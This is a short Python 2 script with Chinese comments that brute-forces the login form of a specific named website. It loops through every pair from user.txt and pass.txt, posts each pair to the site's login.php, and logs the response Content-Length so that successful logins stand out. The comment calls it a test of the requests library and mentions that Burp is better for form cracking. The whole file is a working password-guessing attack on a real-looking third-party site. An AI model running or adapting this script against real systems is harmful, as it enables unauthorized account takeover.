#coding=utf8

'''
仅为测试requests库使用
表单破解还是觉得burp好，前端验证一般都是很复杂的
'''

import requests
def check(user,pwd):
	data={'usern':user,'pass':pwd}
	try:
		r=requests.post('http://www.baobaowoaini.cn/meiyi/login.php?act=saveS',data=data)
		#print r.status_code
		print user+'\t'+pwd+'\t'+r.headers['Content-Length']
	except:
		print user+'\t'+pwd+'\tError'

f_user = open("user.txt")
f_pwd = open("pass.txt")
for uline in f_user:
	user=uline.strip()
	for pline in f_pwd:
		pwd=pline.strip()
		check(user,pwd)
	f_pwd.seek(0)
	
f_user.close()
f_pwd.close()

